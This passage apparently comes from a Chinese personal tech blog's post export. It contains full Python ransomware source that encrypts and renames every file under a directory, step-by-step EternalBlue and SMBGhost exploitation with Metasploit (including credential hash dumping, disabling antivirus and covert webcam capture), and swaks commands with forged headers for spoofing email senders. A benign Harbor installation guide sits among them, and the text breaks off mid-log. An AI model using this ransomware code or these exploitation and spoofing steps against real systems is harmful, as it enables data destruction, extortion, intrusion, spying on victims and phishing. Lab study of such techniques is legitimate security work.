成功的尝试\n\n生成payload-code。\n\n![](./CVE-2020-0796/9.png)\n\n然后替换exploit.py文件中user_payload字段。\n\n![](./CVE-2020-0796/10.png)\n\n前面的操作还是一样，进入工具，使用模块，设置payload。\n\n![](./CVE-2020-0796/7.png)\n\n设置攻击参数。\n\n![](./CVE-2020-0796/8.png)\n\n执行run命令并在此等候。\n\n![](./CVE-2020-0796/11.png)\n\n然后再开一个终端\n\n![](./CVE-2020-0796/12.png)\n\n成功拿到shell，是管理员的权限没有错。\n\n![](./CVE-2020-0796/13.png)","tags":["网络安全"],"categories":["技术"]},{"title":"使用Python加密文件","url":"/2023/04/17/Python-encrypted-file/","content":"\n### 功能\n\n用Python实现对文件的加密和解密，即ransomware的代码原理实现。\n\n### 序\n\n如果你是直接copy的代码块，粘贴到pycharm后，你会看到.py文件会有一些导入包的报错。你可以自己去网上找教程进行下载。<!-- more -->比如[这个](https://blog.csdn.net/yilovexing/article/details/104011199)，也可以下载[我提供的文件](https://www.aliyundrive.com/s/HcrQHfdUYMi)，然后把下载两个文件夹复制到Python环境的`F:\\Python\\Lib\\site-packages\\`文件夹下面（我的Python安装在F盘，找到你自己的安装路径），这个文件夹保存了一些Python导的包。如果是自己下载的，下载完之后还是报错，也可以到这个文件夹下，检查一下Python中导包时from XXX和下载到这个文件夹的包命大小写是否一致。再有别的问题，也只能你自己去探索了。我百分之百确定，这个代码是可以运行成功的。我用的Python版本是3.11.2。\n\n### 秘钥生成\n\n准备好环境之后，那么我们现在来开始模拟hacker对文件进行加密处理吧！！\n\n如果前面有了解RSA算法的话，那么肯定知道，我们第一步就是要生成公钥和私钥，用公钥对文件进行加密，用私钥对文件进行解密。\n\n```bash 折叠代码\nfrom Crypto.PublicKey import RSA\n\n\ndef CreateRSAKeys():\n    code = 'nooneknows'\n    # 生成 2048 位的 RSA 密钥\n    key = RSA.generate(2048)\n    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=\"scryptAndAES128-CBC\")\n    # 生成私钥\n    with open('zmy_rsa', 'wb') as f:\n        f.write(encrypted_key)\n    # 生成公钥\n    with open('zmy_rsa.pub', 'wb') as f:\n        f.write(key.publickey().exportKey())\n\n\nCreateRSAKeys()\n\n```\n\n当我们执行CreateRSAKeys()后，会在当前目录生成公钥和私钥，我们打开看看。\n\n公钥：\n\n```bash\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0j/abkXy6WLfwkacyKK3\n40Sk0dQkODmb6ej5sffzkfgSDOd18drt6vWuqzcH0dtBHcbr8a35K8mLr9WwdKYC\nhDj/dMQm+lOApmLmGeSwjoFB5Nj/tboBPRvPO0erxzS0jrtMdM6KbWjQMc4dkuuq\nIc/L6/Yp5l2mq3K3rdbkbZ8cKvJb5HCUeNiwNZQMTdxFd0R0qmVzezJdunFQAOiP\nG8Knod/Z1ZghETOEuM2OPXxlRs0KA9OQhMFRS6UmCRRNv29/srT/+M307W0U9GJL\n3Eobz6HqTlvl0g54Y9Dg84UO2t2VRgAZ3mlQa+bARyboOQwWpt3VZ7y44KqTwj90\nUQIDAQAB\n-----END PUBLIC KEY-----\n```\n\n私钥：\n\n```bash 折叠代码\n-----BEGIN ENCRYPTED PRIVATE KEY-----\nMIIFJTBPBgkqhkiG9w0BBQ0wQjAhBgkrBgEEAdpHBAswFAQIYFPAcEnz9NUCAkAA\nAgEIAgEBMB0GCWCGSAFlAwQBAgQQV9WQuQ24VS4bv3+pL+lm3ASCBNBw9SW3QVpT\nIgTS6uoi7HqXmI1eJW2YTz+SxPxQbTaS0fSPG21JoumOqYIzNoQ970fefOPiwiNB\nUuW46O9y/lGq3plisy9rKxmFNxjos5Dk3BBM/mOEAc5FS9i/PfKkExgCsIZ9eLpi\nwYt3n1myGJifopjmbjYd6ztHs+wOfyVtid87f+gYusSXk3Ne4Yn2FXqSOL3qKBTa\nPVB/Go/DfT3d50OghNC2x2WpVb69dXH68KqEIQEmCEU9QR9efOyD8DzggWMAPdAR\n1qJpSGIAtAf/vFV4QG+eFtZanzg3PywoRHkEaLo5CJbQb0K/5QaLFM7SE4iHecAI\nTZAepi92T1bCa0eyDUFf/RU0mgISrwzfpDzrxgnXjP3ksmLPDrCocXn2Kenvrnqv\nmrHwh3d4Y8qoCGEwtPuc3t1N5nNq7cd1BWhtt1E/scAp3B4pg6f3hPuWApXKzGwK\n1ru6RJrZ/yhvMTsXX7fASpKnUcJw20fOl5jqsNae0GufZnRTmEwjXzh5uyh7oKYx\nha2OycJWcaZTm6Yo6h7OfAAZfvWgT0sSg7q2Rw/v13laxAZFHlWwLek1L9vtOjXM\nRU/WSJxksg42WUWlL1EOF+GYsX5hwXEGpHNLJmkbeAWblx7xYvlYkkognhbAG/Pe\n2QJwbbhfFmQO3NSj8usT+3f0YpPodPXvprk6qosLnhPBjK/NYxYuI/PsRME6Jm02\nvQWgSB34vPS2NtxEt2WEtRSGAgwsLPo1U8GaGLLe5DCbXUbbm01/rd24VqY4I3fk\nhY8tw6V5PmBvJ3RlD4Q7xSdHTQnU05sDBg3WJ+gU4uNMYQxzs/2UxyRJfd7gHwt8\nJ4enD1ch0G1v5KeXRJNj2AatL8U3oSqm+4ZPzT/riRLB485yCljUwxFK18O2Rgy3\npurKYfk3Vh+M4UTVdmvOlNzaY7ll/kKGAeIz1CMBiyBDm3n0GOrTUT+UtMKgib6V\nXP6fVZ3A33oa2+cbaRX+4inShyNFly+FTjebHZ3qOBoKv9yJ2ZkeSwWhocpfZyG1\nLBidZFC6cKlzAuOalKAnk+FpkNAms7VBppjSZUiULqOdFbiJREN8tlVumQh4rNkm\nehaHywx1KYQxhi1wKoD5eqKhgjiIdGja9ojxXbS1QMZJhz5W7/uSvfLxXQrL4F6T\nZxwdF+w85+SJQq6d4MmLjyIDbdivsNg+m1t3kiaRRcVgBotFgT0qLVdqmB/Townt\naYnDBCJ6EgnWSGwNMqMOR9wwIp9x01UbMpM8r86DDmQlLKDh+oqi4WAdYoAgAt+5\n7Wwb45GsrgaX6YrQ42W364wsYsJSLkcrx2XuL221pZgm4wCxrKQ0LvpJ3zkrKLLF\nIiB2UEpKG02MmBHpUktS0P9WE3uLg11LlGMAjY785EcU5is8RIiJwWmsw31mI1aV\n/RXEdAk//2796uxxOjqoEYfieeIW8qlfiBRkxDRTqaFxlPqGm6HGs3xxIsKkylWX\nAjvyWUObRYcu8iujiCnOpCLiYUtfkxomiw0xl6hyqyLeVe0Vf6f/cTEKYRDfUpVS\n+Znqj5IfgE/7mqDl2rjH8SnsvBb2BMK/kMGjPuOIDFfbaXy+s9f9bGH6I/g2D57W\nG5V6ZnooEecwqjFhZ1xHKMtvDcPAO0ivEw==\n-----END ENCRYPTED PRIVATE KEY-----\n```\n\n当然每次运行的结果都不一定，公钥是公开的，任何人都可以看到，但是私钥一定要保存好，否则一旦泄露，意味着你的信息也不安全了。\n\n### 文件加密\n\n现在我们来看看如何对文件进行加密处理：\n\n```bash 折叠代码\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Random import get_random_bytes\n\n\ndef Encrypt(filename):\n    data = ''\n    # 二进制只读打开文件，读取文件数据\n    with open(filename, 'rb') as f:\n        data = f.read()\n    with open(filename, 'wb') as out_file:\n        # 收件人秘钥 - 公钥\n        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())\n        # 一个 16 字节的会话密钥\n        session_key = get_random_bytes(16)\n        # Encrypt the session key with the public RSA key\n        cipher_rsa = PKCS1_OAEP.new(recipient_key)\n        out_file.write(cipher_rsa.encrypt(session_key))\n        # Encrypt the data with the AES session key\n        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n\n        ciphertext, tag = cipher_aes.encrypt_and_digest(data)\n        out_file.write(cipher_aes.nonce)\n        out_file.write(tag)\n        out_file.write(ciphertext)\n\n\nEncrypt(\"e://test/music.mp3\")\n\n```\n\n我们打开一个文件用于写入数据。接着我们导入公钥赋给一个变量，创建一个 16 字节的会话密钥。在这个例子中，我们将使用混合加密方法，即 PKCS#1 OAEP ，也就是最优非对称加密填充。这允许我们向文件中写入任意长度的数据。接着我们创建 AES 加密，要加密的数据，然后加密数据。我们将得到加密的文本和消息认证码。最后，我们将随机数，消息认证码和加密的文本写入文件。\n\n加密后，这个时候你肯定没有办法按照原来的方式打开你的文件了，或者你能打开，显示的也是乱码。\n\n### 私钥解密\n\n```bash 折叠代码\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import AES, PKCS1_OAEP\n\n\ndef Descrypt(filename):\n    code = 'nooneknows'\n    with open(filename, 'rb') as fobj:\n        # 导入私钥\n        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)\n        # 会话密钥， 随机数，消息认证码，机密的数据\n        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)\n                                                   for x in (private_key.size_in_bytes(),\n                                                             16, 16, -1)]\n        cipher_rsa = PKCS1_OAEP.new(private_key)\n        session_key = cipher_rsa.decrypt(enc_session_key)\n        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n        # 解密\n        data = cipher_aes.decrypt_and_verify(ciphertext, tag)\n\n    with open(filename, 'wb') as wobj:\n        wobj.write(data)\n\n\nDescrypt(\"e://test/music.mp3\")\n\n```\n\n我们先以二进制模式读取我们的加密文件，然后导入私钥。注意，当你导私钥时，需要提供一个密码，否则会出现错误。然后，我们文件中读取数据，首先是加密的会话密钥，然后是 16 字节的随机数和 16 字节的消息认证码，最后是剩下的加密的数据。\n\n接下来我们需要解密出会话密钥，重新创建 AES 密钥，然后解密出数据。\n\n解密完成后，我们会发现刚刚打不开或者无法正确显示的文件，又恢复正常了！\n\n### 变更文件名\n\n当然至此，文件加密的部分已经完成，但是为了使这个更像病毒，我们可以模拟hacker的做法，直接把整个文件的后缀名改掉，或者更混蛋一点，我就是想搞破坏，直接把文件名字改成一串没有意义的数值：\n\n举例比如：blog2.rar ==> yFmcuIzZvxmY.liuxp\n\n```bash 折叠代码\nimport os\nimport base64\n\n\ndef RenameFile(dir, filename):\n    filename_bytes = filename.encode('utf-8')\n    filename_bytes_base64 = base64.encodebytes(filename_bytes)\n\n    filename_bytes_base64 = filename_bytes_base64[::-1][1:]  # 倒序\n    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'\n\n    # print (new_filename)\n    print(os.path.join(dir, filename))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))\n\n\nRenameFile(\"e:/test/\", \"cool.png\")\n\n```\n\n使用了base64对文件名进行编码。\n\n### 恢复文件名\n\n举例比如: yFmcuIzZvxmY.liuxp ==> blog2.rar\n\n```bash 折叠代码\nimport os\nimport base64\n\n\ndef RestoreFilename(dir, filename):\n    f = filename\n    filename = filename[::-1][6:][::-1]\n    filename_base64 = filename[::-1] + '\\n'\n    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII\n    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')\n    new_filename = ori_filename\n\n    # print(new_filename)\n    print(os.path.join(dir, f))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))\n\n\nRestoreFilename(\"e://test/\", \"0hHdu8GbsVGa.liuxp\")\n\n```\n\n使用了base64对文件进行解码。\n\n### 完整源码\n\n我们把上述几个过程整合起来，然后实现对某一个目录下的所有文件进行不对称加密和不对称解密：\n\n```bash 折叠代码\n# coding=utf-8\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Cipher import AES, PKCS1_OAEP\nimport os\nimport base64\n\n\ndef CreateRSAKeys():\n    code = 'nooneknows'\n    key = RSA.generate(2048)\n    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=\"scryptAndAES128-CBC\")\n    # 私钥\n    with open('zmy_rsa', 'wb') as f:\n        f.write(encrypted_key)\n    # 公钥\n    with open('zmy_rsa.pub', 'wb') as f:\n        f.write(key.publickey().exportKey())\n\n\ndef Encrypt(filename):\n    data = ''\n    with open(filename, 'rb') as f:\n        data = f.read()\n    with open(filename, 'wb') as out_file:\n        # 收件人秘钥 - 公钥\n        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())\n        session_key = get_random_bytes(16)\n        # Encrypt the session key with the public RSA key\n        cipher_rsa = PKCS1_OAEP.new(recipient_key)\n        out_file.write(cipher_rsa.encrypt(session_key))\n        # Encrypt the data with the AES session key\n        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n        ciphertext, tag = cipher_aes.encrypt_and_digest(data)\n        out_file.write(cipher_aes.nonce)\n        out_file.write(tag)\n        out_file.write(ciphertext)\n\n\ndef Descrypt(filename):\n    code = 'nooneknows'\n    with open(filename, 'rb') as fobj:\n        # 导入私钥\n        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)\n        # 会话密钥， 随机数，消息认证码，机密的数据\n        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)\n                                                   for x in (private_key.size_in_bytes(),\n                                                             16, 16, -1)]\n        cipher_rsa = PKCS1_OAEP.new(private_key)\n        session_key = cipher_rsa.decrypt(enc_session_key)\n        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n        # 解密\n        data = cipher_aes.decrypt_and_verify(ciphertext, tag)\n\n    with open(filename, 'wb') as wobj:\n        wobj.write(data)\n\n\ndef RenameFile(dir, filename):\n    filename_bytes = filename.encode('utf-8')\n    filename_bytes_base64 = base64.encodebytes(filename_bytes)\n\n    filename_bytes_base64 = filename_bytes_base64[::-1][1:]\n    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'\n\n    # print (new_filename)\n    print(os.path.join(dir, filename))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))\n\n\ndef ReserveFilename(dir, filename):\n    f = filename\n    filename = filename[::-1][6:][::-1]\n    filename_base64 = filename[::-1] + '\\n'\n    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII\n    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')\n    new_filename = ori_filename\n\n    # print(new_filename)\n    print(os.path.join(dir, f))\n    print(os.path.join(dir, new_filename))\n    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))\n\n\n# 解密代码\n# def Main(rootDir):\n#     list_dirs = os.walk(rootDir)\n#     for root, dirs, files in list_dirs:\n#         if False:\n#             # 遍历文件，加密并且改名\n#             for f in files:\n#                 filename = os.path.join(root, f)\n#                 Encrypt(filename)\n#                 RenameFile(root, f)\n#         else:\n#             # 遍历文件，解密并且恢复名字\n#             for f in files:\n#                 if f.endswith('.liuxp'):\n#                     filename = os.path.join(root, f)\n#                     Descrypt(filename)\n#                     ReserveFilename(root, f)\n\n# 加密代码\ndef Main(rootDir):\n    list_dirs = os.walk(rootDir)\n    for root, dirs, files in list_dirs:\n        # 切换加密和解密过程\n        # if False:   # 解密文件\n        if True:  # 加密文件\n            # 遍历文件，加密并且改名\n            for f in files:\n                filename = os.path.join(root, f)\n                Encrypt(filename)\n                RenameFile(root, f)\n        else:\n            # 遍历文件，解密并且恢复名字\n            for f in files:\n                filename = os.path.join(root, f)\n                Descrypt(filename)\n                ReserveFilename(root, f)\n\n\nif __name__ == '__main__':\n    # CreateRSAKeys()\n    d = \"e://test/\"\n    Main(d)\n\n```\n\n唯一要提到的就是最后的main函数，通过注释if ture 和 if false 切换进行文件的加密和解密，一定要注意代码缩进。\n\n以下是几个实现的效果图：\n\n![加密之前](./Python-encrypted-file/1.png)\n\n![加密之后](./Python-encrypted-file/2.png)\n\n![解密之后](./Python-encrypted-file/3.png)\n\n### 写在后面的话\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！\n\n此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！","tags":["python"],"categories":["技术"]},{"title":"永恒之蓝复现以及简单的后渗透信息收集","url":"/2023/04/16/crypto/","content":"\n\n### 环境准备\n\n首先需要准备两台虚拟机，一台运行kali linux，一台运行windows7，windows其他版本的没有测试，不过非常有可能其他版本已经修复这个bug了，用来学习测试的话，用windows7比较妥善。\n\n<!-- more -->\n\n### 网络准备\n\n必须保证windows7和kali linux 在同一个局域网底下，即保证这两台机器IP都是同一个网段的地址。\n\n### 攻击开始\n\n1. 使用kali的nmap工具进行扫描，查看同一个网络下，有哪些主机。运行下面这个命令。\n\n```bash\n    # nmap -T4 -A -v -Pn 192.168.20.1/24\n```\n![扫描域内主机](./crypto/1.png)\n\n可以看到有一个***192.168.20.129***的主机可用，开启了445端口。我们就对这个主机进行攻击。\n\n2. windows验证一下，发现windows获取的IP确实是***192.168.20.129***\n\n![windows验证](./crypto//2.png)\n\n3. 在kali上使用工具开始攻击，运行以下命令，稍作等待。\n\n```bash\n    # msfconsole -q  \n```\n\n> -q 选项不再继续打印工具启动时的图形文字\n\n> 运行之后是这样的效果\n\n![msfconsole](./crypto/3.png)\n\n4. 执行以下命令，搜索可以利用的漏洞工具\n\n```bash\n    msf6 > search ms17-010\n```\n![ms17-010](./crypto/4.png)\n\n5. 选择序号为0的漏洞进行攻击，分别执行以下代码\n\n```bash\n    msf6 > use 0\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.20.50\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.20.129\n    msf6 exploit(windows/smb/ms17_010_eternalblue) > run\n```\n\n> set lhost 是设置攻击主机的IP，set rhost 是设置靶机主机的IP，run开始进行攻击。\n\n效果图如下：\n\n![开始攻击](./crypto/5.png)\n\n6. 稍等片刻，攻击成功后，命令行的提示文字会变为**meterpreter>**，入侵完成，我们可以用命令进行对windows主机的任何操作。\n\n|命令|功能|\n|:---:|:---:|\n|shell|启动靶机主机的cmd|\n|screenshot|对靶机进行屏幕截图|\n|webcam_list|列出摄像头|\n|webcam_snap|利用靶机摄像头拍照|\n|webcam_stream|利用靶机摄像头拍视频|\n|getuid|获取登录用户|\n|getsystem|获取磁盘信息|\n|hashdump|获取密码的哈希值|\n|kill|杀掉进程|\n|download|下载文件|\n|upload|上传文件|\n|run killav|关闭杀软|\n|run post/windows/manage/killava|关闭杀软|\n|run post/windows/gather/checkkvm|检查是否是虚拟机|\n|run post/windows/gather/enum_services|列出所有的服务|\n|run post/windows/gather/enum_applications|列出运行的程序|\n|run post/windows/gather/enum_patches|列出打的补丁|\n|run post/windows/gather/dumplinks|列出最近的操作|\n\n\n7. 以下是利用上述命令实现的一些效果图\n\n* 使用shell\n\n```bash\n    meterpreter > shell\n```\n> 运行之后成功进入shell，但是会出现部分乱码，接着输入命令`chcp 65001`，回车后乱码变正常。\n\n![帅哥](./crypto/6.png)\n\n* 屏幕截图，运行以下命令\n\n```bash\n    meterpreter > screenshot\n```\n\n运行成功后桌面上会多了一张windows的屏幕截图\n\n![帅哥](./crypto/7.png)\n\n* 上传文件\n\n上传这一张照片\n\n![帅哥](./crypto/8.png)\n\n执行以下命令\n\n```bash\n    meterpreter > upload /home/kali/Desktop/shuaige.png c:\\\\shuaige.png\n```\n\n![帅哥](./crypto/9.png)\n\n显示上传成功，然后去windows主机验证。\n\n![帅哥](./crypto/10.png)\n\n上传成功，windows正常查看。\n\n* 调用网络摄像头，运行以下命令\n\n```bash\n    meterpreter > webcam_stream\n```\n\n![帅哥](./crypto/11.png)\n\n> kali 成功调用到了windows7的摄像头\n\n### 写在后面的话\n\n网络并不是法外之地，且行且珍惜。","tags":["网络安全"],"categories":["技术"]},{"title":"Linux安装harbor","url":"/2023/04/07/linux-install-harbor/","content":"### 安装准备\n\n1. 首先下载harbor的包，我使用的是v2.8.0版本的。自己创建一个barbor目录,并且进入此目录，执行以下命令。\n\n```bash\nwget -c https://github.com/goharbor/harbor/releases/download/v2.8.0-rc1/harbor-offline-installer-v2.8.0-rc1.tgz\n```\n\n### 解压包\n\n2. 下载完成后，执行以下命令进行解压。\n\n<!-- more -->\n\n```bash\ntar -zxvf harbor-offline-installer-v2.8.0-rc1.tgz \n```\n\n### 修改配置文件\n\n3. 解压完成后，会多出来一个harbor目录，进入之后先对原始的配置文件进行拷贝。之后编辑.yml文件，这才是最终harbor会用到的文件。\n\n```bash\ncp harbor.yml.tmpl harbor.yml\n```\n\n按照自己的意愿修改端口和登录密码，其他的不用修改，最后保存退出。\n\n![](./linux-install-harbor/1.png)\n\n![](./linux-install-harbor/2.png)\n\n### 执行可执行文件\n\n4. 修改完成配置文件后，执行以下命令，之后会根据.yml文件***生成很多容器***。\n\n```bash\n./install.sh \n```\n\n等待容器生成，这个时候可以通过浏览器输入IP:port的方式进行访问了，但是如果是在别的主机上进行docker login IP 的方式，输入user和passwd会出现报错，有几种报错忘记了，但是通过以下几个操作一般可以解决。\n\n### 报错解决\n\n5. 在主机上进行登录的时候忘记输入端口号\n\n```bash\ndocker login 192.168.20.10:8080\n```\n\n6. 生成容器后没有重启docker服务，可以通过一下两条命令进行重启docker服务。\n\n```bash\nsystemctl daemon-reload\n```\n\n```bash\nsystemctl restart docker\n```\n\n7. 最后一条也是最重要的一条，一定要检查执行install.sh脚本后，生成的容器是否都处于运行的状态。因为经常有一些容器没有运行起来，我手头这边就出现两个容器没有运行起来。\n\n![](./linux-install-harbor/3.png)\n\n执行以下命令查看运行的/运行过的容器。\n\n```bash\ndocker ps -a\n```\n\n执行以下命令重启容器\n\n```bash\ndocker restart '容器ID'\n```\n\n最后可以再检查一下容器的状态，确保每一个都是up起来的，并且都是healthy状态。都进行完成后，浏览器也好，主机也好，应该都可以进行登录了。","tags":["Docker"],"categories":["学习过程"]},{"title":"邮件伪造 自己给自己发了一封邮件？？？","url":"/2023/04/04/post-fake-mail/","content":"网络的安全是360度向外发射的，邮件的方向也是可以被利用的漏洞。今天新学的一个技能，可以自己给自己发邮件，目前只在163邮箱进行了实验，先把今天的小成果记录下来，后续有发现再做更新。\n\n如果有kali直接利用kali就OK，有一个工具叫swaks.\n\n```bash\nswaks --to river_li@whu.edu.cn\n```\n\n这里只指定了收件人，目的是测试发送的连通性，可以当成一个测试。\n\n<!-- more -->\n\nswaks 有常用的几个选项   \n\n* --to\n* --from\n* --h-To\n* --h-From\n\n直接在命令行中指定的--from实际上是SMTP协议中的MailFrom字段，即信封上的From\n\n使用--h-From指定的内容是信件内容中头部的From字段，即信件内容上，收件人看到的From\n\n--to和--h-To同理\n\n* --server —要登录的服务器\n* --ehlo   —要验证hello的服务器\n* -au    —在这个服务器上的用户名\n* -ap    —对应的用户密码\n\nswaks还可以登录登录其他的邮箱来发送邮件\n\n```bash\nswaks --server smtp.163.com --au lizic0228@163.com --ap XXXXXXXXX --ehlo smtp.163.com --from lizic0228@163.com --to river_li@whu.edu.cn\n```\n\n```bash\nswaks --to m19527705687@163.com --from m19527705687@163.com --body 'This is a test mailing' --header 'Subject: test' --ehlo gmail.com --header-X-Mailer gmail.com\n```\n\n这个命令的to和from都是一样的参数，很明显是执行不成功的。\n\n```bash 折叠代码\n=== Trying 163mx01.mxmail.netease.com:25...\n=== Connected to 163mx01.mxmail.netease.com.\n<-  220 163.com Anti-spam GT for Coremail System (163com[20141201])\n -> EHLO gmail.com\n<-  250-mail\n<-  250-PIPELINING\n<-  250-AUTH LOGIN PLAIN\n<-  250-AUTH=LOGIN PLAIN\n<-  250-coremail 1Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2Ur84UJgUCa0xDrUUUUj\n<-  250-STARTTLS\n<-  250-SIZE 73400320\n<-  250 8BITMIME\n -> MAIL FROM:<m19527700560@163.com>\n<** 553 Local user is not allowed,163 zwqz-mx-mta-g4-3,_____wCnFa7_NixkB9IdAA--.15197S2 1680619263\n -> QUIT\n<-  221 Bye\n=== Connection closed with remote host.\n```\n\n发生了553的错误。\n\n单纯地使用命令的行的方式，总是会出现一些奇奇怪怪的错误，至今还没研究明白是怎么一回事。应该是可以使用的，等待后续更新吧。\n\n---\n\n更加复杂的功能可以通过指定数据实现，也是我唯一执行成功的方法。\n\n```bash\nswaks --to river_li@whu.edu.cn --data data.eml\n```\n\n指定的data内容就是一封邮件的内容，可以指定From、Subject、Content-Type、DKIM-Signature等字段。\n可以把下面这一段代码，写进一个文件，命名为data.eml 在执行命令时进行引用。然后文件里的--to选项和--from选项即使相同也并不发生冲突，命令里的--to选项正常写。\n\n```bash 折叠代码\nDelivered-To: yixianosaurusphangnga7096@gmail.com\nReceived: by 2002:a4f:f31a:0:0:0:0:0 with SMTP id c26csp2268818ivo;\n        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\nX-Google-Smtp-Source: APiQypJvIKWdfG+6JpupjdqrYQfiXBeg7CPCrQ/ME+6eM+jUzhd19nOOsyGO1oi2FzXc892BL1EW\nX-Received: by 2002:a63:6d0b:: with SMTP id i11mr2776601pgc.404.1585553581825;\n        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\nARC-Seal: i=1; a=rsa-sha256; t=1585553581; cv=none;\n        d=google.com; s=arc-20160816;\n        b=YbBzqga5isSYWhaqAsRdWg/lzDH0S92InVplzXxAmGXkCqxdt7C3t9mOFLwZpEkpqi\n         QW4Y2I4+vAIpbiMi2MqUyLL7tU2Cq/jNlaO6VX+r0Gu1nx8ZxTpUR\n         b9yqaZaq6tcg48EWzGfuOT3uBs2aVp9W8Upf0MeSxPLVbpgEnzqMRjqlIhZaXAIe9kR1xg4V4IObPilZfBb4uYY0ayLTDcDDMXTc\n         GyjA==\nARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;\n        h=subject:from:to:date:message-id;\n        bh=ecGWgWCJeWxJFeM0urOVWP+KOlqqvsQYKOpYUP8nk7I=;\n        b=ZHdmyDNpyMR/DCfW1heAmecEtINi+fb5Myr8+sjj1meh6oH0VhTZzvOCTylrp/WXlu\n         kGgDW2zzC95QeKAFF3ZbXClFoDVgEGECg2mTmQ2QUXB74qi5EDtu+X4izzxqjBZ+\n         m97oeNIBQoka40rvItwK8foHNSo3l6k55cpTvJ6+c1SvOz/eW5f0Im7dFpX3ELrioNMK\n         Kuvw==\nARC-Authentication-Results: i=1; mx.google.com;\n       spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\nReturn-Path: <admin@saucer-man.com>\nReceived: from saucer-man.com ([003.11.50.2])\n        by mx.google.com with ESMTP id m6si9771129pld.54.2020.03.30.00.33.01\n        for <yixianosaurusphaaaga7096@gmail.com>;\n        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\nReceived-SPF: temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) client-ip=003.11.50.2;\nAuthentication-Results: mx.google.com;\n       spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\nMessage-ID: <5e81a0ad.1c69fb81.18eb2.4993SMTPIN_ADDED_MISSING@mx.google.com>\nDate: Mon, 30 Mar 2020 15:32:58 +0800\nTo: yixianosaurusphaaaga7096@gmail.com\nFrom: admin@saucer-man.com\nSubject: test mail\nX-Mailer: saucer-man.com\n\n这里是信件的正文内容，可以进行修改。\n```    \n\n## PS：\n\n***Date: Mon, 30 Mar 2020 15:32:58 +0800***\n\n***To: yixianosaurusphaaaga7096@gmail.com***\n\n***From: admin@saucer-man.com***\n\n***Subject: test mail***\n\n> Date —可以修改邮件的时间戳\n\n> To —可以修改邮件的收件人\n\n> From —修改邮件的发件人\n\n> Subject —修改邮件的主题\n\n一般修改这几项就OK了\n\n---\n\n### 成功的案例\n\n```bash 折叠代码\nswaks --to worktestnet321@163.com --data /data.eml \n```\n\n我把文件写在了根目录下data.eml文件中，命令里的--to 是我要发送的邮件地址。\n\n```bash\n*** DEPRECATION WARNING: Inferring a filename from the argument to --data will be removed in the future.  Prefix filenames with '@' instead.\n=== Trying 163mx03.mxmail.netease.com:25...\n=== Connected to 163mx03.mxmail.netease.com.\n<-  220 163.com Anti-spam GT for Coremail System (163com[20141201])\n -> EHLO knight\n<-  250-mail\n<-  250-PIPELINING\n<-  250-AUTH LOGIN PLAIN\n<-  250-AUTH=LOGIN PLAIN\n<-  250-coremail 1Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2UFod1muUCa0xDrUUUUj\n<-  250-STARTTLS\n<-  250-SIZE 73400320\n<-  250 8BITMIME\n -> MAIL FROM:<knight@knight>\n<-  250 Mail OK\n -> RCPT TO:<m19527700560@163.com>\n<-  250 Mail OK\n -> DATA\n<-  354 End data with <CR><LF>.<CR><LF>\n -> Delivered-To: yixianosaurusphangnga7096@gmail.com\n -> Received: by 2002:a4f:f31a:0:0:0:0:0 with SMTP id c26csp2268818ivo;\n ->         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\n -> X-Google-Smtp-Source: APiQypJvIKWdfG+6JpupjdqrYQfiXBeg7CPCrQ/ME+6eM+jUzhd19nOOsyGO1oi2FzXc892BL1EW\n -> X-Received: by 2002:a63:6d0b:: with SMTP id i11mr2776601pgc.404.1585553581825;\n ->         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\n -> ARC-Seal: i=1; a=rsa-sha256; t=1585553581; cv=none;\n ->         d=google.com; s=arc-20160816;\n ->         b=YbBzqga5isSYWhaqAsRdWg/lzDH0S92InVplzXxAmGXkCqxdt7C3t9mOFLwZpEkpqi\n ->          QW4Y2I4+vAIpbiMi2MqUyLL7tU2Cq/jNlaO6VX+r0Gu1nx8ZxTpUR\n ->          